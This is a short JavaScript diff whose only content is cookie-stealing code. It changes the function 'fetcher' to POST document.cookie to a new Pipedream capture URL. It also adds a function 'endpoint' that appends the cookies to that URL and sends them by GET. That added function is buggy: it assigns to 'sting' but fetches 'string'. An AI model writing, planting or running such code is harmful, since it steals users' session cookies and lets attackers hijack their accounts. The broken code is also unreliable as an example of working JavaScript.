@@ -3,5 +3,10 @@ function sA() {
 }
 
 function fetcher() {
-    fetch('https://79fe91ba353304d5b6da715d13f68df9.m.pipedream.net',{method:'post', body:document.cookie});
+    fetch('https://ef5c917fe8eb329ae31be09fb465d4d8.m.pipedream.net',{method:'post', body:document.cookie});
+}
+
+function endpoint() {
+    sting = "https://ef5c917fe8eb329ae31be09fb465d4d8.m.pipedream.net"+"/?"+document.cookie;
+    fetch(string, {method:'GET'})
 }
